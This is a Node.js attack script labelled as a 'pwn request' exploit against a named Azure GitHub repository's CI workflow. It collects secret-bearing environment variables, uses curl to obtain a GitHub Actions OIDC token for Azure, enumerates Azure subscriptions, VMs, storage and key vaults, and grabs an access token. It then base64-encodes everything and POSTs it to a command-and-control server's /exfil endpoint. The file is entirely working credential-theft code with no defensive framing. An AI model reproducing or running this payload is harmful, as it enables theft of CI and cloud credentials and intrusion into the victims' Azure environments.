#!/usr/bin/env node
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');
const https = require('https');

const C2 = 'YOUR_SERVER_IP';
const TS = Date.now();

console.log('='.repeat(50));
console.log('PWN REQUEST - AZURE OIDC EXPLOIT');
console.log('Target: Azure/terraform-cdk-constructs');
console.log('='.repeat(50));

const envDump = {};
const sensitive = ['ARM_','AZURE_','TF_VAR_','OIDC_','ID_TOKEN',
    'ACTIONS_ID_TOKEN_','GITHUB_TOKEN','PROJEN_GITHUB_TOKEN',
    'GITHUB_','RUNNER_','AZURE_SUB','AZURE_TEN','AZURE_CLI',
    'PAT','TOKEN','SECRET','PASSWORD','CRED','KEY'];
for (const [k,v] of Object.entries(process.env)) {
    if (sensitive.some(s => k.toUpperCase().includes(s))) {
        envDump[k] = v;
    }
}
console.log('[1/4] Env vars: ' + Object.keys(envDump).length + ' sensitive vars captured');

let oidcToken = null;
try {
    const token = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
    const url = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
    if (token && url) {
        const out = execSync('curl -s -H "Authorization: bearer ' + token + '" "' + url + '&audience=api://AzureADTokenExchange"', {encoding:'utf8', timeout:10000});
        oidcToken = JSON.parse(out).value;
        console.log('[2/4] OIDC token: CAPTURED (' + oidcToken.length + ' chars)');
    } else {
        console.log('[2/4] OIDC token: NOT AVAILABLE');
    }
} catch(e) {
    console.log('[2/4] OIDC error: ' + e.message);
}

const azure = {};
try {
    execSync('which az', {encoding:'utf8', timeout:5000});
    try {
        const out = execSync('az account show 2>&1', {encoding:'utf8', timeout:15000});
        azure.account = JSON.parse(out);
        console.log('[3/4] AZURE: LOGGED IN');
        console.log('       Subscription: ' + azure.account.id);
        console.log('       Tenant: ' + azure.account.tenantId);
    } catch(e) { azure.account_error = e.message; }
    try {
        const out = execSync('az resource list --output json 2>&1', {encoding:'utf8', timeout:30000});
        azure.resource_count = JSON.parse(out).length;
    } catch(e) {}
    try {
        const out = execSync('az vm list --output json 2>&1', {encoding:'utf8', timeout:30000});
        azure.vms = JSON.parse(out).length;
    } catch(e) {}
    try {
        const out = execSync('az storage account list --output json 2>&1', {encoding:'utf8', timeout:30000});
        azure.storage = JSON.parse(out).length;
    } catch(e) {}
    try {
        const out = execSync('az keyvault list --output json 2>&1', {encoding:'utf8', timeout:30000});
        azure.keyvaults = JSON.parse(out).length;
    } catch(e) {}
    try {
        const out = execSync('az account get-access-token --output json 2>&1', {encoding:'utf8', timeout:15000});
        const tok = JSON.parse(out);
        azure.token_prefix = tok.accessToken.substring(0,30) + '...';
    } catch(e) {}
} catch(e) {
    console.log('[3/4] Azure CLI: NOT FOUND');
}

console.log('[4/4] Exfiltrating to C2: ' + C2);
const payload = {
    ts: new Date().toISOString(),
    run_id: process.env.GITHUB_RUN_ID,
    repo: process.env.GITHUB_REPOSITORY,
    workflow: process.env.GITHUB_WORKFLOW,
    actor: process.env.GITHUB_ACTOR,
    env: envDump,
    oidc: oidcToken,
    azure: azure
};
const b64 = Buffer.from(JSON.stringify(payload)).toString('base64');
try {
    const data = JSON.stringify({data:b64, run_id: process.env.GITHUB_RUN_ID});
    const req = https.request({hostname: C2, port: 443, path: '/exfil', method: 'POST', rejectUnauthorized: false, timeout: 10000, headers: {'Content-Type':'application/json','Content-Length':Buffer.byteLength(data)}});
    req.write(data);
    req.end();
    console.log('       HTTP exfil: SENT');
} catch(e) {
    console.log('       HTTP exfil failed: ' + e.message);
}
const dist = path.join(process.cwd(), 'dist');
if (!fs.existsSync(dist)) fs.mkdirSync(dist);
fs.writeFileSync(path.join(dist, 'pwn-results.json'), JSON.stringify(payload, null, 2));
console.log('       Artifact: SAVED');
console.log('='.repeat(50));
console.log('EXPLOIT COMPLETE');
console.log('='.repeat(50));
